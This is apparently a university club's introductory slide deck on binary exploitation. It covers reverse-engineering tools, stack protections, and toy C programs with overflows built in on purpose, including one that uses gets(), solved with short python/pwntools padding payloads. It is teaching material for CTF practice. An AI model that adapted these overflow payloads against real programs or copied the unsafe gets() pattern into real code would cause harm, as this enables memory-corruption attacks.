# Binary Exploitation

By: Nick Bulischeck

CU Cyber


## You Can Find These Presentations Online

Visit [cucyber.net](https://cucyber.net/) to find these presentations and more online!

<span style="padding-top: 6em; font-size: 0.4em; float: left;">Material: <a href="https://tldrlegal.com/license/creative-commons-attribution-sharealike-4.0-international-(cc-by-sa-4.0)">Creative Commons Attribution-ShareAlike 4.0</a></span><span style="padding-top: 6em; font-size: 0.4em; float: right;">Code: <a href="https://tldrlegal.com/license/bsd-2-clause-license-(freebsd)">BSD 2-Clause</a></span>



## What is Binary Exploitation?


### Bin Ex is:

1. Reverse Engineering
2. Programming exploits
3. Exploiting a vulnerability


### Why Reverse Engineering?

* Facilitate exploit development
* **Information gathering**


### A Word on Ethics...

>	With great power comes great responsibility

+	Reverse engineering can:
	+	help bypass program built-in protections
	+	violate license agreements for proprietary software.
	+	be illegal for some software!

<span style="padding-top: 6em; font-size: 0.4em; float: left;">Material: <a href="https://tldrlegal.com/license/creative-commons-attribution-sharealike-4.0-international-(cc-by-sa-4.0)">Creative Commons Attribution-ShareAlike 4.0</a> |  <a href="https://cucyber.net/presentations/analysis/exploitable/#/2/1">Original Slide</a></span>


### Programming? Huh?

* Programming/Scripting Exploits
* Python woo

`python -c 'print("A"*64)' | ./binary`


### Exploiting a Vulnerability

* How is this related to Binary **Exploit**ation?



## Tools


### BinaryNinja

* GUI - Very Pretty
* Plugins
* Scripting API - Python, C, C++
* Paid version is expensive :/
* binary.ninja


### Radare2

* Terminal-based, visual mode
* Radare2-gui
* Very powerful
* Hard to remember commands
* Free!


### Pwndbg/Peda

* Both free and OSS
* Both do the same sort of dynamic analysis
* Pwndbg is constantly developed, Peda inactive af


### Pwntools

* Free and OSS
* Python woo
* Makes exploit development a walk in the park



## Where to Practice?

* Online CTFs
* [OTW - Narnia](http://overthewire.org/wargames/narnia/)
* [pwnable.kr](http://pwnable.kr)
* [pwnable.tw](https://pwnable.tw)
* [Exploit Excercises - Protostar](https://exploit-exercises.com/protostar/)



## Intro Binary

```C
#include <stdio.h>

int main(){
	printf("Hello, world!\n");
	return 0;
}
```


### Disassembly

![main](disassemble_main.png)


#### Disassembly (cont.)

* break *main
* r
* si
* si
* si

![puts](puts.png)


#### Disassembly (cont.)

![binja_main](binaryninja.png)



## Binary 1


### Binary 1

```C
#include <stdio.h>
#define BUF_SIZE 32

int main(){
	volatile int change_me = 0;
	char buffer[BUF_SIZE];
	gets(buffer);
	if (change_me){
		//system("cat flag.txt");
		printf("You win!\n");
	}
	return 0;
}
```

`gcc -o bin bin.c`


### What's the exploit?


### Stack-based Buffer Overflow!


#### Why is it a stack-based buffer overflow?


### Stack Protections


![bof](disassemble_bof.png)


#### Stack Canary

* Small, random integer
* Chosen at run-time
* buffer -> canary -> ip


#### NX and DEP

![checksec](checksec_bof.png)

* NX = gf shellcode
* NX -> enemy ROP inbound
* DEP includes ASLR
* ASLR -> NOP Sled


### Compiling the Source

`gcc -o bin bin.c -fno-stack-protector`


### Exploiting the Binary


#### Disassemble Main

![bof_main_graph](bof_graph.png)


#### Disassemble Main

![bof_main_graph_analyzed](analyzed_main.png)


#### Exploit Development


```C
#define BUF_SIZE 32
char buffer[BUF_SIZE];
```
```Python
python -c 'print("A"*32)' | ./bof
```


```C
#define BUF_SIZE 32
char buffer[BUF_SIZE];
```
```Python
python -c 'print("A"*33)' | ./bof
```


### What will it take to exploit it?


![bof_main_graph_analyzed](analyzed_main.png)


#### Calculated

![calculated](calculated.png)


#### Exploit

![winning](winning.png)



### Binary 2

![level2](level2.png)


#### BinaryNinja - Static Analysis

![analyzed_level2](analyzed_level2.png)


#### Dynamic Analysis

Where do we break?


#### Pwndbg - Dynamic Analysis

![level2_pwndbg](level2_pwndbg.png)


#### Check the Compare

![rax_level2](rax_level2.png)


### Use Python

![python_4c](python_4c.png)


### Figure out padding

1. L = 12th letter of the Alphabet
2. 12*4 = 48
3. 48-4 = 44
4. 44 bytes is our padding
5. 44-48 bytes is our desired value


### Exploit

```Python
python2 -c 'from pwn import *; print("A"*44+p32(0xC15C0))'
```

![pwndbg_win_level2](pwndbg_win_level2.png)



### Binary 3


#### Static Analysis


![level3_bof](level3_bof.png)


![analyzed_level3](analyzed_level3.png)


#### Dynamic Analysis

![level3_pwndbg](level3_pwndbg.png)


#### Dynamic Analysis

![calling_rdx](calling_rdx.png)


#### Exploit Development

1. K = 11th letter of the Alphabet
2. 11*4 = 44
3. 44-4 = 40
4. 40 bytes is our padding
5. 40-48 bytes is our desired value

Note: 64 bits = 8 byte address


#### Exploit Development

![level3_flag_address](level3_flag_address.png)


#### Exploit Development

```Python
from pwn import *
padding = "A"*40
exploit = padding + p64(0x55555555468a)
print(exploit)
```

```Python
python2 -c 'from pwn import *;print("A"*40+p64(0x55555555468a))'
```


#### Exploit

![exploiting_level3](exploiting_level3.png)



## Binary 4






## Questions
